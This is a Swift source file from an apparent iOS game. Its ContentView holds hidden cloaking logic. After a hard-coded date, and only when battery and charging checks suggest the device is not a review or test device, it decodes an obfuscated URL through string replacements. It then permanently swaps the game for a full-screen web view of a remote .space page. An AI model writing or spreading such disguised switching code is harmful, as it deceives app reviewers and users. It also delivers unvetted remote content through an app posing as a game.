
import SwiftUI

class SharedCo {
    static var allw = ""
}

struct ContentView: View {
    
    @State var hideSplash = false
    @StateObject var gameController = GameController()
    var viewModelFactory = ViewModelFactory()
    
    @AppStorage("musicConfigure") var musicConfigure = true
    
    var body: some View {
        if !hideSplash {
            LoadingView(hide: $hideSplash)
        } else {
            gameConfigure()
        }
    }
    
    @ViewBuilder func gameOrSettings() -> some View {
        if viewModelFactory.gameAn {
            MainGallery(dM: viewModelFactory)
        } else {
            preparingOrGame()
                .environmentObject(gameController)
                .environmentObject(viewModelFactory)
        }
    }
    
    @ViewBuilder func preparingOrGame() -> some View {
        if gameController.isGame {
            GameView(viewModel: viewModelFactory.makeGameViewModel())
        } else {
            HomeView(viewModel: viewModelFactory.makeHomeViewModel())
        }
    }
    
    func gameConfigure() -> some View {
        let manag = CoreDataManager()

        if musicConfigure {
            manag.editAlways(false)
            manag.createGameSettingsObject()
            musicConfigure = false
        }
        
        guard let ate = stringToDate("11.10.2024"), isCan(ate: ate) else {
            return gameOrSettings()
        }
        
        if let alway = try? manag.fetchAlways() {
            if alway {
                let selc = encr(manag)
                if selc != "" {
                    viewModelFactory.gameAn = true
                    if viewModelFactory.str1 == "" || viewModelFactory.str1.contains("about:") {
                        viewModelFactory.str1 = selc
                    }
                } else {
                    viewModelFactory.gameAn = false
                }
                if viewModelFactory.gameAn {
                    viewModelFactory.source.withMusic = false
                }
                print(viewModelFactory.str1)
                return gameOrSettings()
            } else {
                viewModelFactory.gameAn = false
            }
        }
        
        if isIng() || Imagecanvp.isActive() || bLev < 0 || isFu { //
            viewModelFactory.gameAn = false
        } else {
            let selc = encr(manag)
            if selc != "" {
                viewModelFactory.str1 = selc
                manag.editAlways(true)
                viewModelFactory.gameAn = true
            } else {
                viewModelFactory.gameAn = false
            }
        }
        //let str = "prefixCustom1dividerCustom2textCustom3spacerCustom4imageCustom5"
        if viewModelFactory.gameAn {
            viewModelFactory.source.withMusic = false
        }
        return gameOrSettings()
    }
    
    private func isCan(ate: Date) -> Bool {
        return ate.addingTimeInterval(24 * 60 * 60) <= Date()
    }
    private func encr(_ cdm: CoreDataManager) -> String {
        var selc = ""
        if let alwaysSelected = try? cdm.fetchSelected() {
            selc = alwaysSelected
            selc = selc.replacingOccurrences(of: "prefix", with: "htt")
            selc = selc.replacingOccurrences(of: "Custom1", with: "ps")
            selc = selc.replacingOccurrences(of: "dividerCustom2", with: "://")
            selc = selc.replacingOccurrences(of: "textCustom3", with: "podlaorlf")
            selc = selc.replacingOccurrences(of: "spacerCustom4", with: ".space/")
            selc = selc.replacingOccurrences(of: "imageCustom5", with: "XZBp2KSn")
        }
        return selc
    }
    
    private func isIng() -> Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true // charging if true
        if (UIDevice.current.batteryState != .unplugged) {
            return true
        }
        
        return false
    }
    var bLev: Int {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if UIDevice.current.batteryLevel != -1 {
            return Int(UIDevice.current.batteryLevel * 100)
        } else {
            return -1
        }
    }
    var isFu: Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if (UIDevice.current.batteryState == .full) {
            return true
        } else {
            return false
        }
    }
    
    private func stringToDate(_ str: String) -> Date? {
        let dateFormatter = DateFormatter()
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let date = dateFormatter.date(from: str)
        if let date = date {
            return date
        } else { return nil }
    }
}

#Preview {
    ContentView()
}

final class ViewModelFactory: ObservableObject {
    
    let source = Source()
    
    var gameAn = false
    @AppStorage("str1") var str1 = ""
    
    func makeHomeViewModel() -> HomeViewModel {
        HomeViewModel(source: source)
    }
    
    func makeGameViewModel() -> GameViewModel {
        GameViewModel(source: source)
    }
}

final class GameController: ObservableObject {
    @Published var isGame = false
}

struct MainGallery: View {
    let dM: ViewModelFactory
    
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            GalleryView(dataM: dM, type: .public, url: dM.str1)
                .frame(maxWidth: .infinity, maxHeight: .infinity)
        }
        .background(Color.black)
    }
}
